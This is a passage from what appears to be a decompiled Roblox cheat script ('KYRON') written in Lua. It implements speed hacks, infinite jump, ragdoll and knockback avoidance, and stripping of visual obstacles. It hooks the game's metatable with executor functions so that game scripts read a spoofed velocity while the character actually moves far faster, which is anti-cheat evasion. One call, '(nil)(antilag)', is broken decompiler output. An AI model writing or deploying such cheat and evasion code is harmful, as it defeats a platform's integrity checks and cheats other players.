                  end
                end)
              end
            end

            fn44()
          end
        end

        do
          local function fn44(KYRONSpeedControllerSession)
            _G._KYRONSpeedControllerSession = KYRONSpeedControllerSession

            _G._KYRONSpeedControllerConn = RunService.RenderStepped:Connect(function()
              if _G._KYRONSpeedControllerSession ~= KYRONSpeedControllerSession then
                return
              end
              local character = localPlayer.Character
              if not character then
                return
              end
              local v78 = character:FindFirstChildOfClass("Humanoid")
              local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
              if not v78 or not humanoidRootPart then
                return
              end

              if _G._KYRONAntiDropEnabled == true then
                return
              end

              if combatSettings and combatSettings.aimbot then
                return
              end
              local state = v78:GetState()
              if v78.PlatformStand or state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
                return
              end
              local moveDirection = v78.MoveDirection
              local n34 = math.clamp(tonumber(fn38()) or 0, 0, 10000)

              if moveDirection.Magnitude > 0 then
                humanoidRootPart.Velocity = Vector3.new(moveDirection.X * n34, humanoidRootPart.Velocity.Y, moveDirection.Z * n34)
              end
            end)
          end

          fn44(tostring({}))
        end

        do
          if _G._KYRONAntiDropUninstall then
            pcall(_G._KYRONAntiDropUninstall)
          end

          _G._KYRONAntiDropUninstall = nil

          task.spawn(function()
            local RunService2 = game:GetService("RunService")
            local localPlayer2 = game:GetService("Players").LocalPlayer
            local KYRONAntiDropEnabled = false

            -- Character velocity and anti-drop controls.
            _G._KYRONSetAntiDrop = function(arg)
              KYRONAntiDropEnabled = arg == true
              _G._KYRONAntiDropEnabled = KYRONAntiDropEnabled
              return KYRONAntiDropEnabled
            end

            KYRONAntiDropEnabled = _G._KYRONAntiDropEnabled == true
            local vector = Vector3.zero
            local v78 = getrawmetatable(game)
            setreadonly(v78, false)
            local index = v78.__index
            local newindex = v78.__newindex

            v78.__index = newcclosure(function(arg, arg2)
              if not checkcaller() then
                local str9 = tostring(arg2)

                if str9 == "AssemblyLinearVelocity" or str9 == "Velocity" then
                  if typeof(arg) == "Instance" and arg:IsA("BasePart") then
                    local name = arg.Name

                    if name == "HumanoidRootPart" or name == "Torso" or name == "UpperTorso" then
                      if arg:IsDescendantOf(localPlayer2.Character) then
                        return vector
                      end
                    end
                  end
                end
              end

              return index(arg, arg2)
            end)

            v78.__newindex = newcclosure(function(arg, arg2, arg3)
              if not checkcaller() then
                local str9 = tostring(arg2)

                if str9 == "AssemblyLinearVelocity" or str9 == "Velocity" then
                  if typeof(arg) == "Instance" and arg:IsA("BasePart") then
                    local name = arg.Name

                    if name == "HumanoidRootPart" or name == "Torso" or name == "UpperTorso" then
                      if arg:IsDescendantOf(localPlayer2.Character) then
                        vector = arg3
                        return
                      end
                    end
                  end
                end
              end

              return newindex(arg, arg2, arg3)
            end)

            setreadonly(v78, true)

            local function fn44()
              local character = localPlayer2.Character
              if not character then
                return nil, nil, nil
              end
              local humanoid = character:FindFirstChildOfClass("Humanoid")
              local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
              if humanoid and humanoid.Health > 0 and humanoidRootPart then
                return character, humanoid, humanoidRootPart
              end
              return nil, nil, nil
            end

            local v79 = Random.new()
            local v80 = 0

            RunService2.PreSimulation:Connect(function(deltaTime)
              v80 += deltaTime
              if v80 < 0.016 then
                return
              end
              v80 = 0
              if not KYRONAntiDropEnabled then
                return
              end
              local v81, v82, v83 = fn44()
              if not v81 or not v82 or not v83 then
                return
              end
              local moveDirection = v82.MoveDirection

              if 0.1 < moveDirection.Magnitude then
                pcall(function()
                  if v83.SetNetworkOwner then
                    v83:SetNetworkOwner(localPlayer2)
                  end
                end)

                local unit = moveDirection.Unit
                local v84 = v79:NextNumber(-0.004, 0.003)
                local v85 = v79:NextNumber(-0.004, 0.003)
                vector = Vector3.new(unit.X * 16 + v84, v83.AssemblyLinearVelocity.Y, unit.Z * 16 + v85)
                v83.AssemblyLinearVelocity = Vector3.new(unit.X * 59 + v84, v83.AssemblyLinearVelocity.Y, unit.Z * 59 + v85)
              else
                vector = Vector3.new(0, v83.AssemblyLinearVelocity.Y, 0)
              end
            end)
          end)

          do
            local v78 = nil

            local function fn44(arg)
              if not arg then
                return
              end
              local head = arg:FindFirstChild("Head") or arg:WaitForChild("Head", 5)
              if not head then
                return
              end
              local KYRONSpeedBB = head:FindFirstChild("KYRONSpeedBB")

              if KYRONSpeedBB then
                KYRONSpeedBB:Destroy()
              end

              local billboardGui = Instance.new("BillboardGui", head)
              billboardGui.Name = "KYRONSpeedBB"
              billboardGui.Size = UDim2.new(0, 140, 0, 42)
              billboardGui.StudsOffset = Vector3.new(0, 1.5, 0)
              billboardGui.AlwaysOnTop = true
              billboardGui.ResetOnSpawn = false
              billboardGui.LightInfluence = 0
              local instance = Instance.new("ImageLabel", billboardGui)
              instance.Name = "KYRONLogo"
              instance.Size = UDim2.new(1, 0, 0.42, 0)
              instance.BackgroundTransparency = 1
              instance.Image = "rbxassetid://120125107258619"
              instance.ScaleType = Enum.ScaleType.Fit
              local textLabel2 = Instance.new("TextLabel", billboardGui)
              textLabel2.Name = "KYRONSpeedValue"
              textLabel2.Size = UDim2.new(1, 0, 0.55, 0)
              textLabel2.Position = UDim2.new(0, 0, 0.43, 0)
              textLabel2.BackgroundTransparency = 1
              textLabel2.Text = "0"
              textLabel2.TextColor3 = _G._KYRONAccent or Color3.fromRGB(255, 255, 240)
              textLabel2.Font = Enum.Font.GothamBlack
              textLabel2:SetAttribute("_KYRONForceGothamBlack", true)
              textLabel2.TextScaled = false
              textLabel2.TextSize = 15
              textLabel2.TextStrokeTransparency = 1
              textLabel2.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
              v78 = textLabel2
              _G._KYRONApplyFontMode(billboardGui)
            end

            task.spawn(function()
              while task.wait(1) do
                local character = localPlayer.Character

                if character then
                  local head = character:FindFirstChild("Head")

                  if head and not head:FindFirstChild("KYRONSpeedBB") then
                    pcall(function()
                      fn44(character)
                    end)
                  end
                end
              end
            end)

            localPlayer.CharacterAdded:Connect(function(character)
              task.wait(0.3)

              pcall(function()
                fn44(character)
              end)
            end)

            if localPlayer.Character then
              task.spawn(function()
                task.wait(0.3)

                pcall(function()
                  fn44(localPlayer.Character)
                end)
              end)
            end

            RunService.RenderStepped:Connect(function()
              if not v78 or not v78.Parent then
                return
              end
              local character = localPlayer.Character
              if not character then
                return
              end
              local v79 = character:FindFirstChildOfClass("Humanoid")
              if not v79 then
                return
              end
              local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
              if not humanoidRootPart then
                return
              end

              if v79.MoveDirection.Magnitude > 0 or Vector3.new(humanoidRootPart.Velocity.X, 0, humanoidRootPart.Velocity.Z).Magnitude > 1 or autoPathState.L or autoPathState.R then
                v78.Text = tostring(math.floor(fn38() * 10 + 0.5) / 10)
              else
                v78.Text = "0"
              end
            end)
          end
        end

        _G._KYRONApplyWorldAccent = function(arg)
          local KYRONAccent = arg or _G._KYRONAccent or Color3.fromRGB(255, 255, 240)
          local character = localPlayer.Character
          character = character and character:FindFirstChild("Head")
          character = character and character:FindFirstChild("KYRONSpeedBB")

          if character then
            for _, child in ipairs(character:GetChildren()) do
              if child:IsA("TextLabel") then
                child.TextColor3 = KYRONAccent
              elseif child:IsA("ImageLabel") and child.Name == "KYRONLogo" then
                child.ImageColor3 = KYRONAccent
              elseif child.Name == "KYRONSpeedDivider" then
                child.BackgroundColor3 = KYRONAccent
              end
            end
          end
        end

        flag14 = false
        setInfiniteJumpEnabled = nil
        _G._KYRONInfJumpMode = "HOLD"

        do
          local function fn44()
            UserInputService.JumpRequest:Connect(function()
              if not flag14 then
                return
              end
              local character = localPlayer.Character
              character = character and character:FindFirstChild("HumanoidRootPart")
              if not character then
                return
              end
              local velocity = character.Velocity
              character.Velocity = Vector3.new(velocity.X, 55, velocity.Z)
            end)

            UserInputService.InputBegan:Connect(function(input)
              if input.UserInputType ~= Enum.UserInputType.Keyboard or input.KeyCode ~= Enum.KeyCode.Space or UserInputService:GetFocusedTextBox() then
                return
              end

              task.delay(0.2, function()
                if flag14 and UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                  local character = localPlayer.Character
                  character = character and character:FindFirstChild("HumanoidRootPart")

                  if character then
                    local velocity = character.Velocity
                    character.Velocity = Vector3.new(velocity.X, 50, velocity.Z)
                  end
                end
              end)
            end)

            RunService.Heartbeat:Connect(function()
              if not flag14 or _G._KYRONInfJumpMode ~= "HOLD" then
                return
              end
              local character = localPlayer.Character
              local v78 = character and character:FindFirstChild("HumanoidRootPart")
              if not v78 then
                return
              end
              local humanoid = character:FindFirstChildOfClass("Humanoid")

              if (UserInputService:IsKeyDown(Enum.KeyCode.Space) or humanoid and humanoid.Jump == true) and v78.Velocity.Y < 30 then
                local velocity = v78.Velocity
                v78.Velocity = Vector3.new(velocity.X, 50, velocity.Z)
              end

              if v78.Velocity.Y < -120 then
                local velocity = v78.Velocity
                v78.Velocity = Vector3.new(velocity.X, -40, velocity.Z)
              end
            end)

            setInfiniteJumpEnabled = function(arg)
              flag14 = arg and true or false
            end
          end

          fn44()
        end
      end
    end

    do
      local fn38, fn39

      do
        ragdollRecoveryState = { enabled = false, conn = nil, ResetCooldown = 0 }

        if _G._KYRONRagCountdownEnabled == nil then
          _G._KYRONRagCountdownEnabled = true
        end

        startRagdollRecovery = function()
          if ragdollRecoveryState.conn then
            return
          end
          ragdollRecoveryState.enabled = true

          ragdollRecoveryState.conn = RunService.Heartbeat:Connect(function()
            if not ragdollRecoveryState.enabled then
              return
            end
            local character = localPlayer.Character
            if not character then
              return
            end
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
            if not humanoid or not humanoidRootPart or humanoid.Health <= 0 then
              return
            end
            local state = humanoid:GetState()
            if state ~= Enum.HumanoidStateType.Physics and state ~= Enum.HumanoidStateType.Ragdoll and state ~= Enum.HumanoidStateType.FallingDown then
              return
            end
            local now2 = tick()
            if now2 - ragdollRecoveryState.ResetCooldown <= 0.15 then
              return
            end
            ragdollRecoveryState.ResetCooldown = now2

            pcall(function()
              for _, descendant in ipairs(character:GetDescendants()) do
                if descendant:IsA("Motor6D") then
                  descendant.Enabled = true
                end

                if descendant:IsA("ParticleEmitter") then
                  descendant.Enabled = true
                end
              end

              humanoid.PlatformStand = false
              humanoid.Sit = false
              humanoid.AutoRotate = true
              humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
              humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
              humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
              local currentCamera = workspace.CurrentCamera

              if currentCamera then
                currentCamera.CameraSubject = humanoid
              end

              local playerScripts = localPlayer:FindFirstChild("PlayerScripts")
              playerScripts = playerScripts and playerScripts:FindFirstChild("PlayerModule")
              local controlModule = playerScripts and playerScripts:FindFirstChild("ControlModule")

              if controlModule then
                local module = require(controlModule)

                if module and module.Enable then
                  module:Enable()
                end
              end
            end)
          end)
        end

        stopRagdollRecovery = function()
          ragdollRecoveryState.enabled = false

          if ragdollRecoveryState.conn then
            ragdollRecoveryState.conn:Disconnect()
            ragdollRecoveryState.conn = nil
          end
        end

        do
          local flag16 = false

          fn38 = function()
            local playerGui2 = localPlayer:FindFirstChild("PlayerGui")
            playerGui2 = playerGui2 and playerGui2:FindFirstChild("RagCountdownBillboard")
            if playerGui2 then playerGui2:Destroy() end
          end

          -- Persistent ragdoll/grab status above the local player's head.
          _G._KYRONSetRagCountdownEnabled = function(arg)
            _G._KYRONRagCountdownEnabled = arg and true or false
            if not _G._KYRONRagCountdownEnabled then
              flag16 = false
              fn38()
            end
          end

          local function fn40()
            local character = localPlayer.Character
            if not character then return nil, nil end
            local head = character:FindFirstChild("Head")
            if not head then return nil, nil end
            local v78 = localPlayer:FindFirstChild("Backpack")
            if not v78 then return nil, nil end

            local ragCountdownBillboard = v78:FindFirstChild("RagCountdownBillboard")
            if ragCountdownBillboard then
              local existingLabel = ragCountdownBillboard:FindFirstChild("CountdownLabel")
              if existingLabel and existingLabel:IsA("TextLabel") then
                ragCountdownBillboard.Adornee = head
                return ragCountdownBillboard, existingLabel
              end
              ragCountdownBillboard:Destroy()
            end

            local billboardGui = Instance.new("BillboardGui")
            billboardGui.Name = "RagCountdownBillboard"
            billboardGui.Size = UDim2.new(0, 200, 0, 70)
            billboardGui.StudsOffset = Vector3.new(0, 0.5, 0)
            billboardGui.AlwaysOnTop = true
            billboardGui.Adornee = head
            billboardGui.ResetOnSpawn = false
            billboardGui.Parent = v78

            local textLabel = Instance.new("TextLabel")
            textLabel.Name = "CountdownLabel"
            textLabel.Size = UDim2.new(1, 0, 1, 0)
            textLabel.AnchorPoint = Vector2.new(0.5, 0.5)
            textLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
            textLabel.BackgroundTransparency = 1
            textLabel.Font = Enum.Font.GothamBlack
            textLabel.TextScaled = true
            textLabel.TextColor3 = colors and colors.accent or _G._AviceAccent or Color3.fromRGB(255, 255, 255)
            textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            textLabel.TextStrokeTransparency = 0
            textLabel.Text = "DON'T GRAB"
            textLabel.Parent = billboardGui
            _G._KYRONApplyFontMode(billboardGui)
            return billboardGui, textLabel
          end

          local function fn41(textLabel, text)
            if not textLabel or not textLabel.Parent then return end
            textLabel.TextColor3 = colors and colors.accent or _G._AviceAccent or Color3.fromRGB(255, 255, 255)
            textLabel.Text = text
          end

          fn39 = function()
            if _G._KYRONRagCountdownEnabled == false or flag16 then return end
            flag16 = true
            task.spawn(function()
              local v78, v79 = fn40()
              if not v78 then flag16 = false return end
              local v80 = 1.6
              while v80 > 0 and v78.Parent and _G._KYRONRagCountdownEnabled ~= false do
                if v79 and v79.Parent then fn41(v79, string.format("%.1f", v80)) end
                task.wait(0.1)
                v80 -= 0.1
              end
              -- Do not destroy/recreate it: immediately switch the same UI.
              if v78 and v78.Parent and _G._KYRONRagCountdownEnabled ~= false and v79 and v79.Parent then
                fn41(v79, localPlayer:GetAttribute("Stealing") == true and "GRAB" or "DON'T GRAB")
              end
              flag16 = false
            end)
          end

          -- Instant switch when the player grabs: same Billboard, no disappearing.
          local ragGrabStateConn = localPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()
            if _G._KYRONRagCountdownEnabled == false then return end
            if flag16 then return end
            local backpack = localPlayer:FindFirstChild("Backpack")
            local billboardGui = backpack and backpack:FindFirstChild("RagCountdownBillboard")
            local textLabel = billboardGui and billboardGui:FindFirstChild("CountdownLabel")
            if not billboardGui or not textLabel then return end
            fn41(textLabel, localPlayer:GetAttribute("Stealing") == true and "GRAB" or "DON'T GRAB")
          end)
        end
      end

      local flag16 = false

      RunService.Heartbeat:Connect(function()
        if not ragdollRecoveryState.enabled or _G._KYRONRagCountdownEnabled == false then
          flag16 = false

          if _G._KYRONRagCountdownEnabled == false then
            fn38()
          end

          return
        end

        local character = localPlayer.Character
        if not character then
          flag16 = false
          return
        end
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid or humanoid.Health <= 0 then
          flag16 = false
          return
        end
        local state = humanoid:GetState()
        local flag17 = state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown

        if flag17 and not flag16 then
          flag16 = true
          fn39()
        elseif not flag17 then
          flag16 = false
        end
      end)
    end

    do
      local flag16, fn38

      do
        _G._KYRONAntiBat = _G._KYRONAntiBat or { enabled = false, conn = nil }

        -- Anti-bat, character animation, and movement helpers.
        _G._KYRONStartAntiBat = function()
          if _G._KYRONAntiBat.conn then
            return
          end
          _G._KYRONAntiBat.enabled = true

          _G._KYRONAntiBat.conn = RunService.Heartbeat:Connect(function()
            if not _G._KYRONAntiBat.enabled then
              return
            end
            local character = localPlayer.Character
            if not character then
              return
            end
            local v78 = character:FindFirstChild("HumanoidRootPart")
            if not v78 or not v78.Parent then
              return
            end
            local vector = Vector3.new(v78.Velocity.X, 0, v78.Velocity.Z)
            v78.Velocity = Vector3.new(1000, v78.Velocity.Y, 1000)
            RunService.RenderStepped:Wait()

            if v78 and v78.Parent then
              v78.Velocity = Vector3.new(vector.X, v78.Velocity.Y, vector.Z)
            end
          end)
        end

        _G._KYRONStopAntiBat = function()
          _G._KYRONAntiBat.enabled = false

          if _G._KYRONAntiBat.conn then
            _G._KYRONAntiBat.conn:Disconnect()
            _G._KYRONAntiBat.conn = nil
          end
        end

        if _G._KYRONStopUnwalk then
          pcall(_G._KYRONStopUnwalk)
        end

        _G._KYRONUnwalk = { enabled = false, savedAnimate = nil }
        _G._KYRONStartUnwalk = nil
        _G._KYRONStopUnwalk = nil
        _G._KYRONTryHard = _G._KYRONTryHard or { enabled = false, conn = nil, originalAnims = nil }

        -- Animation replacement and restoration helpers.
        _G._KYRONApplyTryHard = function()
          local tbl36 = {
            idle1 = "rbxassetid://133806214992291",
            idle2 = "rbxassetid://94970088341563",
            walk = "rbxassetid://707897309",
            run = "rbxassetid://707861613",
            jump = "rbxassetid://116936326516985",
            fall = "rbxassetid://116936326516985",
            climb = "rbxassetid://116936326516985",
            swim = "rbxassetid://116936326516985",
            swimidle = "rbxassetid://116936326516985",
          }

          local function fn39(arg)
            if not arg then
              return false
            end

            for _, v78 in pairs(tbl36) do
              if v78 == arg then
                return true
              end
            end

            return false
          end

          local function KYRONTryHardSave(arg)
            local animate = arg:FindFirstChild("Animate")
            if not animate then
              return
            end

            local function fn40(arg2)
              return arg2 and arg2.AnimationId or nil
            end

            local originalAnims = {
              idle1 = fn40(animate.idle and animate.idle.Animation1),
              idle2 = fn40(animate.idle and animate.idle.Animation2),
              walk = fn40(animate.walk and animate.walk.WalkAnim),
              run = fn40(animate.run and animate.run.RunAnim),
              jump = fn40(animate.jump and animate.jump.JumpAnim),
              fall = fn40(animate.fall and animate.fall.FallAnim),
              climb = fn40(animate.climb and animate.climb.ClimbAnim),
              swim = fn40(animate.swim and animate.swim.Swim),
              swimidle = fn40(animate.swimidle and animate.swimidle.SwimIdle),
            }

            if not fn39(originalAnims.walk) then
              _G._KYRONTryHard.originalAnims = originalAnims
            end
          end

          local function KYRONTryHardApplyPack(arg)
            local animate = arg:FindFirstChild("Animate")
            if not animate then
              return
            end

            local function fn40(arg2, animationId)
              if arg2 then
                arg2.AnimationId = animationId
              end
            end

            fn40(animate.idle and animate.idle.Animation1, tbl36.idle1)
            fn40(animate.idle and animate.idle.Animation2, tbl36.idle2)
            fn40(animate.walk and animate.walk.WalkAnim, tbl36.walk)
            fn40(animate.run and animate.run.RunAnim, tbl36.run)
            fn40(animate.jump and animate.jump.JumpAnim, tbl36.jump)
            fn40(animate.fall and animate.fall.FallAnim, tbl36.fall)
            fn40(animate.climb and animate.climb.ClimbAnim, tbl36.climb)
            fn40(animate.swim and animate.swim.Swim, tbl36.swim)
            fn40(animate.swimidle and animate.swimidle.SwimIdle, tbl36.swimidle)
          end

          if _G._KYRONTryHard.conn then
            _G._KYRONTryHard.conn:Disconnect()
            _G._KYRONTryHard.conn = nil
          end

          local character = localPlayer.Character

          if character then
            KYRONTryHardSave(character)
            KYRONTryHardApplyPack(character)
            local humanoid = character:FindFirstChildOfClass("Humanoid")

            if humanoid then
              for _, v78 in ipairs(humanoid:GetPlayingAnimationTracks()) do
                pcall(function()
                  v78:Stop(0)
                end)
              end

              pcall(function()
                humanoid:ChangeState(Enum.HumanoidStateType.Running)
              end)
            end
          end

          local n33 = 0

          _G._KYRONTryHard.conn = RunService.Heartbeat:Connect(function()
            local now2 = tick()
            if now2 < n33 then
              return
            end
            n33 = now2 + 0.25
            local character2 = localPlayer.Character

            if character2 then
              KYRONTryHardApplyPack(character2)
            end
          end)

          _G._KYRONTryHardSave = KYRONTryHardSave
          _G._KYRONTryHardApplyPack = KYRONTryHardApplyPack
        end

        _G._KYRONStopTryHard = function()
          _G._KYRONTryHard.enabled = false

          if _G._KYRONTryHard.conn then
            _G._KYRONTryHard.conn:Disconnect()
            _G._KYRONTryHard.conn = nil
          end

          local character = localPlayer.Character
          local animate = character and character:FindFirstChild("Animate")
          local originalAnims = _G._KYRONTryHard.originalAnims

          if animate and originalAnims then
            local function fn39(arg, animationId)
              if arg and animationId then
                arg.AnimationId = animationId
              end
            end

            fn39(animate.idle and animate.idle.Animation1, originalAnims.idle1)
            fn39(animate.idle and animate.idle.Animation2, originalAnims.idle2)
            fn39(animate.walk and animate.walk.WalkAnim, originalAnims.walk)
            fn39(animate.run and animate.run.RunAnim, originalAnims.run)
            fn39(animate.jump and animate.jump.JumpAnim, originalAnims.jump)
            fn39(animate.fall and animate.fall.FallAnim, originalAnims.fall)
            fn39(animate.climb and animate.climb.ClimbAnim, originalAnims.climb)
            fn39(animate.swim and animate.swim.Swim, originalAnims.swim)
            fn39(animate.swimidle and animate.swimidle.SwimIdle, originalAnims.swimidle)
          end

          character = character and character:FindFirstChildOfClass("Humanoid")

          if character then
            for _, v78 in ipairs(character:GetPlayingAnimationTracks()) do
              pcall(function()
                v78:Stop(0)
              end)
            end
          end
        end

        RunService.Stepped:Connect(function()
          for _, player in ipairs(Players:GetPlayers()) do
            if player ~= localPlayer and player.Character then
              for _, child in ipairs(player.Character:GetChildren()) do
                if child:IsA("BasePart") then
                  child.CanCollide = false
                end
              end
            end
          end
        end)

        localPlayer.CharacterAdded:Connect(function(character)
          if _G._KYRONTryHard.enabled then
            task.wait(0.5)

            if _G._KYRONTryHardSave then
              _G._KYRONTryHardSave(character)
            end

            if _G._KYRONTryHardApplyPack then
              _G._KYRONTryHardApplyPack(character)
            end
          end

          if _G._KYRONAntiBat and _G._KYRONAntiBat.enabled then
            task.wait(0.25)
            _G._KYRONStopAntiBat()
            _G._KYRONStartAntiBat()
          end
        end)

        Lighting_ = game:GetService("Lighting")

        if _G._KYRONAntiLagDescConn then
          pcall(function()
            _G._KYRONAntiLagDescConn:Disconnect()
          end)
        end

        _G._KYRONAntiLagDescConn = nil
        _G._KYRONAntiLagScanToken = {}

        if type(_G._KYRONAntiLagHiddenObstacleVolumes) == "table" then
          for k in pairs(_G._KYRONAntiLagHiddenObstacleVolumes) do
            pcall(function()
              if k and k.Parent then
                k.LocalTransparencyModifier = 0
              end
            end)
          end
        end

        _G._KYRONAntiLagHiddenObstacleVolumes = {}
        connection = nil
        tbl33 = {}
        tbl34 = {}
        flag15 = false
        tbl35 = {}
        n31 = 1
        n32 = 0
        flag16 = false
        KYRONAntiLagHiddenObstacleVolume = _G._KYRONAntiLagHiddenObstacleVolumes

        do
          local function fn39(arg)
            if not arg:IsA("BasePart") then
              return false
            end
            local events = workspace:FindFirstChild("Events")
            if not events or not arg:IsDescendantOf(events) then
              return false
            end
            local parent = arg.Parent

            while parent and parent ~= events do
              if parent.Name == "ObstacleVolumes" then
                return true
              end
              parent = parent.Parent
            end

            return false
          end

          fn38 = function(arg)
            pcall(function()
              if arg:IsA("BasePart") then
                if fn39(arg) then
                  if KYRONAntiLagHiddenObstacleVolume[arg] == nil then
                    KYRONAntiLagHiddenObstacleVolume[arg] = arg.LocalTransparencyModifier
                  end

                  arg.LocalTransparencyModifier = 1
                end

                arg.Material = Enum.Material.Plastic
                arg.Reflectance = 0
                arg.CastShadow = false
              elseif arg:IsA("Decal") or arg:IsA("Texture") then
                arg.Transparency = 1
              elseif arg:IsA("ParticleEmitter") or arg:IsA("Trail") or arg:IsA("Beam") or arg:IsA("Fire") or arg:IsA("Smoke") or arg:IsA("Sparkles") then
                arg.Enabled = false
              elseif arg:IsA("PointLight") or arg:IsA("SpotLight") or arg:IsA("SurfaceLight") then
                arg.Enabled = false
              elseif arg:IsA("AnimationController") or arg:IsA("Animator") then
                for _, v78 in ipairs(arg:GetPlayingAnimationTracks()) do
                  pcall(function()
                    v78:Stop(0)
                  end)
                end
              end
            end)
          end
        end
      end

      do
        local function fn39(arg)
          if not flag15 or not arg then
            return
          end
          n32 += 1
          tbl35[n32] = arg
          if flag16 then
            return
          end
          flag16 = true
          local KYRONAntiLagScanToken = _G._KYRONAntiLagScanToken

          task.spawn(function()
            while flag15 and KYRONAntiLagScanToken == _G._KYRONAntiLagScanToken and n31 <= n32 do
              for i = 1, math.min(40, n32 - n31 + 1) do
                local v78 = tbl35[n31]
                tbl35[n31] = nil
                n31 += 1

                if v78 then
                  fn38(v78)
                end
              end

              task.wait()
            end

            if n31 > n32 then
              tbl35 = {}
              n31 = 1
              n32 = 0
            end

            flag16 = false
          end)
        end

        startAntiLag = function()
          flag15 = true
          tbl35 = {}
          n31 = 1
          n32 = 0
          _G._KYRONAntiLagScanToken = {}
          local KYRONAntiLagScanToken = _G._KYRONAntiLagScanToken
          tbl33.Brightness = tbl33.Brightness or Lighting_.Brightness
          tbl33.FogEnd = tbl33.FogEnd or Lighting_.FogEnd
          tbl33.FogStart = tbl33.FogStart or Lighting_.FogStart
          tbl33.Diffuse = tbl33.Diffuse or Lighting_.EnvironmentDiffuseScale
          tbl33.Specular = tbl33.Specular or Lighting_.EnvironmentSpecularScale
          tbl33.Ambient = tbl33.Ambient or Lighting_.Ambient
          tbl33.Brightness = tbl33.Brightness or Lighting_.Brightness
          Lighting_.GlobalShadows = false
          Lighting_.FogEnd = 1e10
          Lighting_.FogStart = 1e10
          Lighting_.EnvironmentDiffuseScale = 0
          Lighting_.EnvironmentSpecularScale = 0
          Lighting_.Brightness = 3
          Lighting_.Ambient = Color3.fromRGB(65, 60, 60)

          pcall(function()
            local terrain = workspace.Terrain
            tbl34.Decoration = tbl34.Decoration ~= nil and tbl34.Decoration or terrain.Decoration
            tbl34.WaterWaveSize = tbl34.WaterWaveSize or terrain.WaterWaveSize
            tbl34.WaterWaveSpeed = tbl34.WaterWaveSpeed or terrain.WaterWaveSpeed
            tbl34.WaterReflectance = tbl34.WaterReflectance or terrain.WaterReflectance
            tbl34.WaterTransparency = tbl34.WaterTransparency or terrain.WaterTransparency
            terrain.Decoration = false
            terrain.WaterWaveSize = 0
            terrain.WaterWaveSpeed = 0
            terrain.WaterReflectance = 0
            terrain.WaterTransparency = 1
          end)

          pcall(function()
            local level01 = Enum.QualityLevel.Level01
            settings().Rendering.QualityLevel = level01
            local level012 = Enum.MeshPartDetailLevel.Level01
            settings().Rendering.MeshPartDetailLevel = level012
          end)

          for _, child in ipairs(Lighting_:GetChildren()) do
            pcall(function()
              if child:IsA("BlurEffect") or child:IsA("SunRaysEffect") or child:IsA("ColorCorrectionEffect") or child:IsA("BloomEffect") or child:IsA("Atmosphere") then
                child.Enabled = false
              end
            end)
          end

          task.spawn(function()
            local descendants = workspace:GetDescendants()

            for i, descendant in ipairs(descendants) do
              if not flag15 or KYRONAntiLagScanToken ~= _G._KYRONAntiLagScanToken then
                return
              end
              fn38(descendant)

              if i % 100 == 0 then
                task.wait()
              end
            end
          end)

          if connection then
            connection:Disconnect()
          end

          connection = workspace.DescendantAdded:Connect(function(descendant)
            if flag15 then
              fn39(descendant)
            end
          end)

          _G._KYRONAntiLagDescConn = connection
        end
      end
    end
  end

  local fn38, fn39, fn40, fn41, infJump, flag16, flag17, flag18, flag19, flag20
  local antiLag, flag21, flag22, flag23, flag24, flag25, HttpService, str9, flag26, fn42
  local fn43, fn44, fn45, fn46, fn47, tbl36, n33, flag27

  do
    do
      do
        do
          do
            local function fn48()
              flag15 = false
              _G._KYRONAntiLagScanToken = {}
              tbl35 = {}
              n31 = 1
              n32 = 0

              if connection then
                connection:Disconnect()
                connection = nil
              end

              _G._KYRONAntiLagDescConn = nil

              for k, v78 in pairs(KYRONAntiLagHiddenObstacleVolume) do
                pcall(function()
                  if k and k.Parent then
                    k.LocalTransparencyModifier = v78
                  end
                end)
              end

              table.clear(KYRONAntiLagHiddenObstacleVolume)

              pcall(function()
                Lighting_.GlobalShadows = true

                if tbl33.Brightness ~= nil then
                  Lighting_.Brightness = tbl33.Brightness
                end

                if tbl33.FogEnd ~= nil then
                  Lighting_.FogEnd = tbl33.FogEnd
                end

                if tbl33.FogStart ~= nil then
                  Lighting_.FogStart = tbl33.FogStart
                end

                if tbl33.Diffuse ~= nil then
                  Lighting_.EnvironmentDiffuseScale = tbl33.Diffuse
                end

                if tbl33.Specular ~= nil then
                  Lighting_.EnvironmentSpecularScale = tbl33.Specular
                end

                if tbl33.Ambient ~= nil then
                  Lighting_.Ambient = tbl33.Ambient
                end

                if tbl33.Brightness ~= nil then
                  Lighting_.Brightness = tbl33.Brightness
                end

                local terrain = workspace.Terrain

                if tbl34.Decoration ~= nil then
                  terrain.Decoration = tbl34.Decoration
                end

                if tbl34.WaterWaveSize ~= nil then
                  terrain.WaterWaveSize = tbl34.WaterWaveSize
                end

                if tbl34.WaterWaveSpeed ~= nil then
                  terrain.WaterWaveSpeed = tbl34.WaterWaveSpeed
                end

                if tbl34.WaterReflectance ~= nil then
                  terrain.WaterReflectance = tbl34.WaterReflectance
                end

                if tbl34.WaterTransparency ~= nil then
                  terrain.WaterTransparency = tbl34.WaterTransparency
                end

                for _, child in ipairs(Lighting_:GetChildren()) do
                  pcall(function()
                    if child:IsA("BlurEffect") or child:IsA("SunRaysEffect") or child:IsA("ColorCorrectionEffect") or child:IsA("BloomEffect") or child:IsA("DepthOfFieldEffect") then
                      child.Enabled = true
                    end
                  end)
                end
              end)
            end

            local v78 = nil

            local function fn49(antilag)
              visualSettings.antilag = antilag

              if v78 then
                (nil)(antilag)
              end

              if antilag then
                startAntiLag()
              else
                fn48()
              end
            end

            -- Anti-lag and visual-scan helpers.
            _G._KYRONLegacyStartAntiLag = function()
              fn49(true)
            end

            _G._KYRONLegacyStopAntiLag = function()
              fn49(false)
            end
          end
        end

        do
          _G._KYRONStartVisualStrip = function()
            if _G._KYRONVisualStripOn then
              return
            end
